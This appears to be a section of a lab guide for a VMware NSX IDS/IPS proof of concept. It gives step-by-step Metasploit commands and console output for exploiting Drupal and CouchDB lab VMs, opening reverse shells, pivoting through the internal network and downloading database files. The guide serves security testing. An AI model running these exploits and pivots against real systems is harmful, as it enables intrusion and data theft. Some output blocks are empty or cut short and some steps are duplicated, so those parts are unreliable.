## 7. Lateral Movement Scenario
**Estimated Time to Complete: 30 minutes**

In this exercise, we will again establish a **reverse shell** from the Drupal server, and use it as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 

**Open a SSH/Console session to the External VM**
1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
    * Username **vmware**
    * Password **VMware1!**
2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 

**Initiate DrupalGeddon2 attack against the App1-WEB-TIER VM (again)**
1.	Type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
    * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
    * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
    * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
    * Type **exploit -z** to initiate the exploit, esbalish a reverse shell, and background the session.
    
```console
msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.10.101
RHOST => 192.168.10.101
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 8080
RPORT => 8080
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit -z

[*] Started reverse TCP handler on 10.114.209.151:4444
[*] Sending stage (38288 bytes) to 192.168.10.101
[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:50982) at 2020-07-21 20:30:34 -0500
[*] Session 1 created in the background.
msf5 exploit(unix/webapp/drupal_drupalgeddon2) >
```
    
**Route traffic to the Internal Network through the esablished reverse shell**
1.	Once the Meterpreter session is established and backgrounded, type **route add 192.168.20.0/24 1**, where the subnet specified is the subnet of the **Internal Segment**
```console
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
[*] Route added
```
2.	Now that we have instructed Metapsloit to route traffic to the internal subnet through the reverse shell, we can pivot the attack and attack the **App1-APP-TIER VM** on the internal network, which is running a vulnerable **CouchDB** Service. 

**Initiate CouchDB Command Execution attack against App1-APP-TIER VM**
1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
    * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-APP-TIER VM**. (check the NSX VM Inventory to confirm)
    * Type **set LHOST 10.114.209.151** to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
    * Type **set LPORT 4445** to define the local port to use. The reverse shell will be established to this local port
    * Type **exploit** to initiate the exploit and esbalish a command shell
```console
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
[*] Using configured payload linux/x64/shell_reverse_tcp
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.100
RHOST => 192.168.20.100
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
LHOST => 10.114.209.151
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
LPORT => 4445
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
```
2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App1-WEB-APP VM** back to the **Extermal VM**
```console
[*] Started reverse TCP handler on 10.114.209.151:4445
[*] Generating curl command stager
[*] Using URL: http://0.0.0.0:8080/l8sEqcccZNK
[*] Local IP: http://10.114.209.151:8080/l8sEqcccZNK

[*] Sending payload to 10.114.209.148 (curl/7.38.0)
[*] Command shell session 2 opened (10.114.209.151:4445 -> 10.114.209.148:50665) at 2020-07-22 08:48:51 -0500
[+] Deleted /tmp/jekukcmc
[+] Deleted /tmp/okmyzfondlujy
[*] Server stopped.
```
3. You can now interact with the shell session or upgrade to a more powerful Meterpreter session. In order to upgrade to Meterpreter, you can run the below commands 
    * Type **background** to move the shell session to the background. Confirm by entering **y**
    * Type **use multi/manage/shell_to_meterpreter** to select the shell to meterpreter upgrade module
    * Type **set LPORT 8081** to define the local port to use. The reverse shell will be established to this local port
    * Type **set session 2** to indicate the reverse command shell session from **App1-APP-TIER VM** is the one we want to upgrade
    * Type **exploit** to establish the session

```console
background
Background session 2? [y/N]  y
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > use multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > set LPORT 8081
LPORT => 8081
msf5 post(multi/manage/shell_to_meterpreter) > set session 2
session => 2
msf5 post(multi/manage/shell_to_meterpreter) > exploit
```
4. Confirm a **Meterpreter** reverse TCP session was established from **App1-APP-TIER VM** back to the **Extermal VM** and interact with the session.
```console
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.114.209.151:8081
[*] Sending stage (980808 bytes) to 10.114.209.148
[*] Meterpreter session 3 opened (10.114.209.151:8081 -> 10.114.209.148:59526) at 2020-07-22 09:42:42 -0500
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
```
5. You can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-APP-TIER VM**
    * Type **sessions -l** to see all established sessions
```console
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l

> **Note**: The VMs deployed in this lab run Drupal and CouchCB services as containers (built using Vulhub). The establshed session puts you into the container **cve201712635_couchdb_1** container shell.

6.	Now we can pivot the attack once more and laterally move to other application VM deployed in the same network segment as **App1-APP-TIER VM**. We will will use the same **apache_couchdb_cmd_exec** exploit to  the **App2-APP-TIER VM** on the internal network, which also is running a vulnerable **CouchDB** Service. 

**Initiate CouchDB Command Execution attack against App2-APP-TIER VM through App-1-APP-TIER VM**
1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
    * Type **background** to move the open meterpreter session to the background.
    * Type **route add 192.168.20.101/32 3** to route traffic to the **App2-APP-TIER VM** through the previusly established meterpreter session. The IP address specified should be the IP address of the **App2-APP-TIER VM**
    * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
    * Type **set RHOST 192.168.20.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App2-APP-TIER VM**. (check the NSX VM Inventory to confirm)+
    * Type **set LHOST 10.114.209.151** to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
    * Type **set LPORT 4446** to define the local port to use. The reverse shell will be established to this local port
    * Type **exploit** to initiate the exploit and esbalish a command shell
```console
meterpreter > background
[*] Backgrounding session 3...

LPORT => 4446
msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
```
2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM**
```console2
[*] Started reverse TCP handler on 10.114.209.151:4446

```
3. You can now also upgrade this shell to Meterpreter, by running the below commands 
    * Type **background** to move the shell session to the background. Confirm by entering **y**
    * Type **use multi/manage/shell_to_meterpreter** to select the shell to meterpreter upgrade module
    * Type **set LPORT 8082** to define the local port to use. The reverse shell will be established to this local port
    * Type **set session 4** to indicate the reverse command shell session from **App2-APP-TIER VM** is the one we want to upgrade
    * Type **exploit** to establish the session
```console
background
Background session 4? [y/N]  y

LPORT => 8081
msf5 post(multi/manage/shell_to_meterpreter) > set session 4
session => 4
msf5 post(multi/manage/shell_to_meterpreter) > exploit
```
4. Confirm a **Meterpreter** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM** and interact with the session. You may see 2 Meterpreter sessions get established. 
```console
[*] Upgrading session ID: 4

[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
```

5. You can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App2-APP-TIER VM**
    * Type **sessions -l** to see all established sessions
```console
msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
```
   * Type **sessions -i 5** to interact with the newly established **Meterpreter** session
   * You can now run commands as in the previous exercise to gain more information about the **App2-APP-TIER VM**, retrieve or destroy data. 
   * Type **ls /opt/couchdb/data** to see CouchDB database files   
   * Type **download /opt/couchdb/data** to see CouchDB database files
```console

```
This completes the lateral movement attack scenario. Now we will go back to NSX manager and investigat this attack. Skip the below step #5 if you have gone through the manaul attack steps above.

6. If you prefer not to manually go through this attack scenario, using the above steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
**RHOST** on line 3 should be the IP address of the **App1-WEB-TIER VM**
**SUBNET** on line 6 (route add) should be the **Internal Network** subnet
**LHOST** on line 9 should be the IP address of the **External VM** (this local machine)
**RHOST** on line 10 should be the IP address of the **App1-APP-TIER VM**
**RHOST** on line 13 should be the IP address of the **App2-APP-TIER VM**

> **Note**: This scripted attack does not upgrade shell sessions to meterpreter sessions nor does it interact with the sessions. To interact with the established sessions, but it will cause the same signatures to fire on the NSX IDS/IPS.


**Confirm IDS/IPS Events show up in the NSX Manager UI**
1.	In the NSX Manager UI, navigate to Security -->  Security Overview
2. Under the **Insights** tab, confirm you see a number of attempted intrusion against the  **APP-1-WEB-TIER** workload
![](Images/IDPS_POC_13.PNG)
3. Navigate to Security --> East West Security --> Distributed IDS
4. Confirm 4 signatures have fired:
    * One exploit-specific signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
    * One exploit-specific signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
    
one exploit-specific signature for **DrupalGeddon2** and one broad signature indicating the use of a **Remote Code execution via a PHP script**


3. Click  **APP-1-WEB-TIER** to open a filtered event view for this workload. 
4. Confirm 2 signatures have fired; one exploit-specific signature for **DrupalGeddon2** and one broad signature indicating the use of a **Remote Code execution via a PHP script**
